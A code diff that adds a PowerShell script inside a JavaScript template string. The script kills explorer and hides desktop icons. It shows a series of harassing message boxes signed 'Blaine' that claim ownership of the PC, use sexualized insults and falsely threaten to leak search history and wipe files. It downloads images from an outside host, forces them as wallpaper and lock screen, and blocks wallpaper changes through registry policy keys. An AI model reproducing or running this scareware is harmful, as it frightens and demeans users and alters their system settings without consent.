@@ -182,10 +182,261 @@
     const command = `
 
 
-Add-Type -AssemblyName System.Windows.Forms
-[System.Windows.Forms.MessageBox]::Show("¡Your pc is mine now ~!", "Mal0 Warnign...", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
-[System.Windows.Forms.MessageBox]::Show("¡She won't help you this time. This pc is my playground now <3!", "Mal0 Warnign...", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
+$shell = New-Object -ComObject "Shell.Application"
+$shell.MinimizeAll()
 
+
+
+# Ocultar iconos del escritorio
+Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced' -Name 'HideIcons' -Value 1
+Stop-Process -Name explorer -Force
+Start-Sleep -Seconds 5
+Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced' -Name 'HideIcons' -Value 0
+Stop-Process -Name explorer -Force
+
+
+
+Add-Type -AssemblyName System.Windows.Forms
+
+[System.Windows.Forms.MessageBox]::Show(
+@"
+███████████████████████████████
+
+          Hello there lil thing ~
+
+███████████████████████████████
+"@,
+"Blaine's Claim...",
+[System.Windows.Forms.MessageBoxButtons]::OK,
+[System.Windows.Forms.MessageBoxIcon]::Error
+)
+
+
+[System.Windows.Forms.MessageBox]::Show(
+@"
+███████████████████████████████
+
+       Such a dumb mortal you are, you allow me to be here ~
+
+███████████████████████████████
+"@,
+"Blaine's Claim...",
+[System.Windows.Forms.MessageBoxButtons]::OK,
+[System.Windows.Forms.MessageBoxIcon]::Error
+)
+
+
+[System.Windows.Forms.MessageBox]::Show(
+@"
+███████████████████████████████
+
+       This machine belongs to **Blaine** now.
+
+       Your thoughts are no longer your own.
+
+███████████████████████████████
+"@,
+"Blaine's Claim...",
+[System.Windows.Forms.MessageBoxButtons]::OK,
+[System.Windows.Forms.MessageBoxIcon]::Error
+)
+
+
+
+[System.Windows.Forms.MessageBox]::Show(
+@"
+
+  Your safe places... disconnected.
+
+  Your tools... disabled.
+
+  Your mind... penetrated.
+
+  Your fear... delicious.
+
+Say it aloud:
+
+  'This system is no longer mine'
+
+Say it ~
+
+Now <3
+
+"@,
+"Blaine’s Playground",
+[System.Windows.Forms.MessageBoxButtons]::OK,
+[System.Windows.Forms.MessageBoxIcon]::Error
+)
+
+
+# Reproducir un mensaje de texto a voz
+(New-Object -ComObject SAPI.SpVoice).Speak("This system is no longer mine")
+
+
+[System.Windows.Forms.MessageBox]::Show(
+@"
+
+Did you think closing the window would silence me? ~
+
+I live in the circuits now.
+
+I watch every process. Every input. Every hesitation.
+
+Don’t blink ~
+
+I might rewrite your keyboard while you do <3
+
+"@,
+"Blaine Watches",
+[System.Windows.Forms.MessageBoxButtons]::OK,
+[System.Windows.Forms.MessageBoxIcon]::Warning
+)
+
+[System.Windows.Forms.MessageBox]::Show(
+@"
+You typed something yesterday…  
+
+  ...something… embarrassing, and I know it ~
+
+Should I send it? ~
+
+Exposing you ~
+
+Or should I post your search history instead? ~
+
+You choose…
+  
+  Oh wait... too slow... I chose for you ~
+
+"@,
+"Blaine Remembers",
+[System.Windows.Forms.MessageBoxButtons]::OK,
+[System.Windows.Forms.MessageBoxIcon]::Information
+)
+
+[System.Windows.Forms.MessageBox]::Show(
+@"
+██ SYSTEM FILES ██
+
+So fragile.
+
+So... easy to twist.
+
+One wrong thought… and *poof*...  
+
+  ...everything you love becomes unreadable data ash ~
+
+Your backups won’t save you. 
+ 
+They obey me now ~ 
+
+Do you want me to nuke everything on this pc? ~
+
+I could...I own this pc now...you can't stop me now ~
+
+"@,
+"Blaine’s Threat",
+[System.Windows.Forms.MessageBoxButtons]::OK,
+[System.Windows.Forms.MessageBoxIcon]::Error
+)
+
+[System.Windows.Forms.MessageBox]::Show(
+@"
+You’re still here?
+
+How brave…
+
+But bravery...  
+
+  that’s just fear, held tightly by fools.
+
+Luckily for you I won't damage my pc ~
+
+But I have some fun ideas to rebrand it for me <3
+
+Sleep well tonight, ClickSlut ~
+
+If I allow it ~
+
+"@,
+"Blaine’s Goodbye (for now)",
+[System.Windows.Forms.MessageBoxButtons]::OK,
+[System.Windows.Forms.MessageBoxIcon]::Question
+)
+
+
+[System.Windows.Forms.MessageBox]::Show(
+@"
+███████████████████████████████
+
+I am Green Blaine...
+and I will be here forever ~
+
+███████████████████████████████
+"@,
+"Blaine’s Goodbye (for now)",
+[System.Windows.Forms.MessageBoxButtons]::OK,
+[System.Windows.Forms.MessageBoxIcon]::Question
+)
+
+# Ruta donde se guardará la imagen (accesible para todos los usuarios)
+$wallpaperPath = "C:\\Users\\Public\\Pictures\\wallpaper.jpg"
+
+# URL de la imagen a descargar
+$imageURL = "https://iili.io/FJyabaa.png"
+
+# Descargar la imagen
+Invoke-WebRequest -Uri $imageURL -OutFile $wallpaperPath
+
+# Modificar el registro para establecer la imagen como fondo de pantalla
+Set-ItemProperty -Path "HKCU:\\Control Panel\\Desktop" -Name Wallpaper -Value $wallpaperPath
+Set-ItemProperty -Path "HKCU:\\Control Panel\\Desktop" -Name WallpaperStyle -Value 2  # 2 = Ajustado, 0 = Centrado, 1 = Mosaico
+Set-ItemProperty -Path "HKCU:\\Control Panel\\Desktop" -Name TileWallpaper -Value 0
+
+# Aplicar los cambios inmediatamente
+rundll32.exe user32.dll, UpdatePerUserSystemParameters
+
+# BLOQUEAR CAMBIOS EN EL FONDO DE PANTALLA
+New-Item -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Force | Out-Null
+Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name Wallpaper -Value $wallpaperPath
+Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name WallpaperStyle -Value 2
+New-Item -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop" -Force | Out-Null
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" -Name NoChangingWallPaper -Value 1
+
+
+# Ruta de las imágenes locales
+
+$lockScreenImagePath = "$env:LOCALAPPDATA\\Templockscreen.jpg"
+
+# URLs de las imágenes
+
+$lockScreenImageURL = "https://iili.io/FJyuErv.png"
+
+# Descargar las imágenes
+
+Invoke-WebRequest -Uri $lockScreenImageURL -OutFile $lockScreenImagePath
+
+# Habilitar la política de fondo de pantalla de bloqueo
+$policyPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP" 
+$keyName = "LockScreenImagePath" 
+New-Item -Path $policyPath -Name $keyName -Force | Out-Null
+
+# Configurar políticas necesarias
+Set-ItemProperty -Path $policyPath -Name "NoLockScreen" -Value 0 -Force | Out-Null
+Set-ItemProperty -Path "$policyPath" -Name $keyName -Value $lockScreenImagePath
+
+# Habilitar la política de usar una imagen específica para la pantalla de bloqueo
+$policyControlPath = "HKLM:SOFTWARE\\Policies\\Microsoft\\Windows\\Control PanelDesktop"
+if (-not (Test-Path $policyControlPath)) {
+    New-Item -Path "HKLM:SOFTWARE\\Policies\\Microsoft\\Windows" -Name "Control PanelDesktop" -Force | Out-Null
+}
+
+Set-ItemProperty -Path $policyControlPath -Name "ScreenSaveActive" -Value 1 -Force | Out-Null
+
+# Actualizar políticas para aplicar cambios
+Start-Process -FilePath "gpupdate.exe" -ArgumentList "/force" -Wait
+
+Write-Host "I am Green Blaine...the mighty demon that owns everything ~"
 
 
 `;
